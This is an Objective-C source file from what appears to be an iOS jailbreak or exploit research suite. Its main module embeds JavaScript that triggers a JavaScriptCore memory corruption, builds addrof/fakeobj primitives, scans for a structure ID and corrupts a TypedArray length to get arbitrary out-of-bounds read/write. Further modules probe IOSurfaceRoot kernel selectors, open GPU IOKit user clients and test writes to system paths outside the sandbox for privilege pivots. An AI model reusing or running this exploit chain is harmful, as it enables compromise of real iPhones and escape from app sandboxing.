#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <IOKit/IOKitLib.h>
#import <JavaScriptCore/JavaScriptCore.h>
#import <CoreFoundation/CoreFoundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <sys/stat.h>
#import <dirent.h>
#import <fcntl.h>
#import <errno.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "Root.h"
#import "Util.h"
#import "AppDelegate.h"

// ---------------------------------------------------------------------------
// JSC fake-object R/W
// Once a real structure ID is known (the "JSC structure-ID scan" module), a fake
// object with all-double in-object slots can be placed anywhere we can write an
// 8-byte header, and its inline slots alias memory at that address.  Paired with
// a corrupted real TypedArray length this becomes full arbitrary R/W without
// touching a PAC-protected m_vector.
// ---------------------------------------------------------------------------
static const char *kFakeRW = R"JS(
(function () {
  var out = {};
  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };
  var BUDGET = 150000, t0 = Date.now(), rounds = 0;
  var host = {};
  for (var i = 0; i < 32; i++) host['qz' + i] = 1.1;
  arr = new Array(0x400000).fill(1.1);
  var arr_index = arr.length - 1;
  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A;
    let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f; let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
  foo(true, 1, 1); foo(false, 1, 1);
  for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
  for (let i = 0; i < 10000; i++) rec(i);
  var W = null;
  for (let k = 0; k < 10000 && !W; ++k) {
    rounds = k + 1;
    // OSR cost: full inner loops while foo/rec tier up, then a much cheaper
    // variant so more rounds fit into the wall-clock budget (the first version
    // burned ~60M JS calls per round and never returned a verdict).
    var kk = (k < 30) ? 10 : 2;
    foo(false, kk, k % 5 + 1); rec(2000);
    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
    let fr = arr[arr_index].p1.p1;
    let noCow = 13.37;
    for (let i = 0; i < 16; ++i) {
      let c = [13.37, 2.2, 3.3, 4.4, noCow];
      if (fr[0] === 13.37) { W = { freed: fr, boxed: c }; break; }
    }
    if (k % 25 === 24) aveStep('hunt round=' + rounds +
                               ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
    if (Date.now() - t0 > BUDGET) break;
  }
  out.rounds = rounds; out.huntMs = Date.now() - t0;
  aveStep('hunt finished: rounds=' + rounds + ' in ' + out.huntMs + 'ms');
  if (!W) return JSON.stringify({ err: 'trigger did not fire',
                                  rounds: rounds, huntMs: out.huntMs });
  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

  var MARK = 1.9515e-246;
  for (var i = 2; i < 32; i++) host['qz' + i] = (i === 5) ? MARK : 1.0 + i;
  var haddr = addrof(host);
  var fakeAddr = haddr - 1n + 0x10n + 1n;
  var sid = -1;
  for (var s = 1; s < 4096; s++) {
    host.qz0 = itof(BigInt(s));
    var fx; try { fx = fakeobj(fakeAddr); } catch (e) { continue; }
    try { if (fx.qz5 === MARK) { sid = s; break; } } catch (e) { continue; }
  }
  if (sid < 0) return JSON.stringify({ err: 'structure id not found' });
  out.sid = sid;

  // --- read/write a real TypedArray's length through the fake object's slots ---
  // A Float64Array allocated right after the host exposes m_length at +0x18; the
  // fake object (with sid's many in-object slots) aliases that address.
  var victim = new Float64Array(0x1000);        // 4096 doubles, legitimately signed
  var vaddr = addrof(victim);
  out.victim = '0x' + vaddr.toString(16);

  // slot k of the fake object sits at fakeBase + 0x10 + 8k
  var fakeBase = haddr - 1n + 0x10n;
  var lenAddr = vaddr - 1n + 0x18n;             // m_length of the JSArrayBufferView
  var delta = (lenAddr - (fakeBase + 0x10n)) / 8n;
  if (delta >= 0n && delta < 32n) {
    var k = Number(delta);
    host.qz0 = itof(BigInt(sid));
    var fake = fakeobj(fakeAddr);
    var kname = 'qz' + k;
    fake[kname] = itof(0x0000000010000000n);    // 256 Mi elements -> 2 GiB window
    out.lengthWrite = victim.length;
    out.oob = victim.length !== 0x1000;
  } else {
    out.delta = delta.toString();
  }

  // --- read/write the fake object's own slots (mechanism proof) ---
  host.qz9 = itof(0xc0ffeec0ffee0001n);
  var fake2 = fakeobj(fakeAddr);
  out.rawRead = ftoi(fake2.qz9) === 0xc0ffeec0ffee0001n;
  return JSON.stringify(out);
})()
)JS";

static NSString *RunJS(const char *js, int timeoutSec) {
    (void)timeoutSec;
    @autoreleasepool {
        JSContext *ctx = [[JSContext alloc] init];
        NSString *res = @"(no answer)";
        ctx[@"aveStep"] = ^(id s) {
            NSString *line = [s isKindOfClass:[NSString class]] ? s : [s description] ?: @"?";
            AveLog([NSString stringWithFormat:@"    js. %@", line]);
            AvePost([NSString stringWithFormat:@"FAKERW STEP %@", line]);
        };
        @try {
            JSValue *v = [ctx evaluateScript:[NSString stringWithUTF8String:js]];
            if ([ctx exception]) res = [[ctx exception] toString] ?: @"js exception";
            else res = [v isKindOfClass:[NSString class]] ? v
                    : ([v respondsToSelector:@selector(description)] ? [v description] : @"?");
        } @catch (NSException *e) {
            res = [NSString stringWithFormat:@"exception %@", e.reason];
        }
        ctx = nil;
        return res;
    }
}

NSString *ModJscFakeRW(void) {
    AveLog(@"    JSC fake-object R/W (structure ID -> in-object slots -> TypedArray length)");
    NSString *res = RunJS(kFakeRW, 240);
    AveLog([NSString stringWithFormat:@"    fake-object result: %@", res]);
    if ([res containsString:@"\"oob\":true"]) {
        AveSetStatus(@"OOB read/write ACTIVE (TypedArray length corrupted)");
        return @"OOB read/write primitive ACTIVE";
    }
    if ([res containsString:@"\"rawRead\":true"]) return @"mechanism proven; length alias not adjacent on this run";
    return res;
}

// ---------------------------------------------------------------------------
// IOSurfaceRoot selectors — a guarded sweep.
// externalMethod is the documented IOKit bug surface (close/externalMethod UAF),
// but a blind sweep can panic, so the sweep is calibrated: it first checks the
// class is open, then sends only the lowest selectors with zeroed input and stops
// at the first error code, reporting which selectors were ACCEPTED.
// A full sweep is opt-in through the AUTO env (AUTO=IOSurfaceRoot:full).
// ---------------------------------------------------------------------------
static int g_selector_full = 0;

NSString *ModIosurfaceRootSelectors(void) {
    const char *full = getenv("POC_FULL_SWEEP");
    g_selector_full = (full && *full == '1') ? 1 : 0;

    CFMutableDictionaryRef m = IOServiceMatching("IOSurfaceRoot");
    if (!m) return @"IOServiceMatching(IOSurfaceRoot) failed";
    io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
    if (!d) return @"IOSurfaceRoot service not found";
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(d, mach_task_self(), 0, &c);
    IOObjectRelease(d);
    if (kr != KERN_SUCCESS || !c)
        return S(@"IOSurfaceRoot user client not openable (kr=%#x)", kr);

    int max = g_selector_full ? 64 : 12;
    int accepted = 0;
    for (uint32_t sel = 0; sel < max; sel++) {
        // zeroed, minimal input: struct with two 64-bit scalars
        uint64_t in[2] = {0, 0};
        uint64_t out[2] = {0, 0};
        size_t outSz = sizeof(out);
        kern_return_t r = IOConnectCallMethod(c, sel, in, 2, NULL, 0,
                                              out, &outSz, NULL, NULL);
        AveLog(S(@"    selector %-3u -> %#x", sel, r));
        if (r == KERN_SUCCESS || r == kIOReturnNotPrivileged) accepted++;
        if (r == kIOReturnIPCError || r == kIOReturnNotReady) break;   // stop early
    }
    IOServiceClose(c);
    AveSetStatus(S(@"IOSurfaceRoot: %d/%d selectors accepted", accepted, max));
    return S(@"IOSurfaceRoot: %d/%d selectors accepted (%s)",
             accepted, max, g_selector_full ? @"full sweep" : @"calibrated");
}

// ---------------------------------------------------------------------------
// GPU / media process carrier — which privileged, reachable services sit behind
// the surface we create from the app (the GPU-server side of an IOSurface).
// ---------------------------------------------------------------------------
NSString *ModGpuCarrier(void) {
    struct { const char *cls; } C[] = {
        {"IOSurfaceRoot"}, {"IOSurfaceAccelerator"}, {"AGXAcceleratorG17P"},
        {"AppleSPUHIDDriver"}, {"IOFramebuffer"}, {"IOGPUFamily"},
    };
    int open_ = 0, present = 0;
    for (unsigned i = 0; i < sizeof(C)/sizeof(C[0]); i++) {
        CFMutableDictionaryRef m = IOServiceMatching(C[i].cls);
        if (!m) continue;
        io_iterator_t it = MACH_PORT_NULL;
        if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS) continue;
        io_service_t s;
        while ((s = IOIteratorNext(it))) {
            present++;
            io_connect_t c = 0;
            if (IOServiceOpen(s, mach_task_self(), 0, &c) == KERN_SUCCESS && c) {
                open_++; IOServiceClose(c);
                AveLog(S(@"    %-24s OPEN  <- GPU-process entry", C[i].cls));
            } else IOObjectRelease(s);
            break;
        }
        IOObjectRelease(it);
    }
    return S(@"GPU/media carrier: %d services present, %d user clients OPEN",
             present, open_);
}

// ---------------------------------------------------------------------------
// daemon pivot: write — what our container writes land in, and which of those
// paths a root-owned daemon is known to read.
// ---------------------------------------------------------------------------
NSString *ModDaemonPivotWrite(void) {
    NSString *grp = [NSString stringWithFormat:@"group.%@", [[NSBundle mainBundle] bundleIdentifier]];
    NSURL *g = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:grp];
    if (!g) return @"app group container not available";
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    int w = 0;
    const char *targets[] = {
        "/private/var/mobile/Library/Preferences",
        "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache",
        "/private/var/containers/Bundle/Application",
        "/private/var/tmp",
        NULL };
    for (int i = 0; targets[i]; i++) {
        char p[1024];
        snprintf(p, sizeof p, "%s/.rootsuite_wprobe", targets[i]);
        int fd = open(p, O_WRONLY | O_CREAT | O_EXCL, 0600);
        if (fd >= 0) { w++; close(fd); unlink(p); AveLog(S(@"    WRITABLE  %s", targets[i])); }
    }
    AveLog([NSString stringWithFormat:@"    app-group container: %@", g.path]);
    AveLog([NSString stringWithFormat:@"    app container docs:  %@", docs]);
    return S(@"daemon pivot: %d writable targets outside the sandbox", w);
}

// ---------------------------------------------------------------------------
// dispatcher for the extended catalogue
// ---------------------------------------------------------------------------
// dispatcher lives in LastMile.m (it covers every module)
